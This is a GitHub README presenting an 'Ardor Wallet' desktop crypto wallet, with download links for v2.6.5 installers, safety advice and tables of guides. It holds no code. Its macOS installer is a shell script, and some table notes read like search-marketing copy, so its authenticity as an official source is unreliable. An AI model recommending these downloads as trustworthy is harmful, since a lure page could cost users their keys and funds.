![Ardor Wallet GitHub page](assets/banner-profile.png)

<h1 align="center">Ardor Wallet</h1>

<p align="center">Self-custody for ARDR and every Ardor child chain, on Windows, macOS and Linux</p>

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-1562a1?style=for-the-badge&labelColor=0c395d" alt="License: AGPL-3.0"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5"><img src="https://img.shields.io/badge/RELEASE-v2.6.5-1562a1?style=for-the-badge&labelColor=0c395d" alt="Release v2.6.5"></a></p>

---

## Downloads - v2.6.5

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor Wallet GitHub page is the home of the desktop wallet this account publishes for the Ardor platform, and of the guides that explain it. The wallet runs on Windows, macOS and Linux, opens ARDR and every Ardor child chain with one passphrase or seed, and either validates the chain on your own machine or reads it from a remote node.

Everything on this page is self-custody. Keys stay on your computer, no server keeps an account in your name, and no password reset exists. That one design decision explains most of the questions the guides answer, from a balance that reads zero during the first download to a passphrase typed into the wrong page.

The guides are grouped by the job you are trying to finish: installing and updating, keeping the passphrase and its backups, deciding whether the software can be trusted, holding and moving ARDR. Each one answers its own question in the first sentence, then shows the steps, then names what to do when the steps do not work. Nothing is written to fill space, and no page asks you to paste a secret anywhere.

Two habits run through the whole set. Installers come from the release page, and the SHA-256 values published there are the ones to compare before a first run. The recovery phrase is written on paper before the account holds anything, is never typed into a page that asks for it, and is never sent to anyone, including someone offering help.

## Start here

> [!TIP]
> New here? These five answer the questions most readers arrive with.

<div align="center">

| Guide | Why this one |
| --- | --- |
| [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md) | Ignis is the busiest child chain, and 250 US searches a month ask what it is. |
| [What the Ardor blockchain is, how it works, and what else is called Ardor](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ardor-blockchain-platform.md) | The platform question behind almost every other one. |
| [How to buy ARDR, move it into your own wallet, and swap out](https://github.com/ardor-software/ardor-wallet-guides/blob/main/how-to-buy-ardor-and-ardr.md) | Buying ARDR is the commercial intent, and the withdrawal step matters most. |
| [What happened to the Nxt chain, and where the token is now](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-happened-to-the-nxt-chain-on-ardor.md) | Where NXT holders ended up after the migration. |
| [What forging means on Ardor, and why it is not mining](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) | Forging is the most misunderstood part of the network. |

</div>

## Guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md) | Install the Ardor wallet on each platform, pick the right asset and check the Java runtime. |
| [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md) | Check the installer and its SHA-256 value before the first run. |
| [Create an Ardor account, read its address, and watch one without a passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) | Create an account, read its address, and watch one without a passphrase. |
| [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md) | Move an Ardor wallet to a new computer without losing the only secret. |

</div>

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Ardor passphrase or seed phrase: which one do you have](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-passphrase-versus-seed-phrase.md) | Tell a legacy passphrase from a seed phrase before following any advice. |
| [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md) | What makes the Ardor wallet safe in practice, and what undoes it. |
| [Spot a phishing wallet that asks for your passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/spot-a-phishing-ardor-wallet.md) | Recognise a fake wallet page before you type the passphrase into it. |
| [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md) | Step through the causes of a stalled sync, from peers to disk space. |

</div>

All 54 guides in this repository sit on one page: [every Ardor Wallet guide, grouped by topic](https://github.com/ardor-software/ardor-software/blob/main/index.md).

## The guide repositories

Two more repositories hold the rest of the set: [Ardor forging and node guides](https://github.com/ardor-software/ardor-forging-and-nodes) and [Ardor platform guides](https://github.com/ardor-software/ardor-platform-guides).

---

[The Ardor desktop wallet](https://github.com/ardor-software/ardor-desktop-wallet) - [release v2.6.5](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5) - [all guides](https://github.com/ardor-software/ardor-software/blob/main/index.md) - [report an issue](https://github.com/ardor-software/ardor-desktop-wallet/issues)
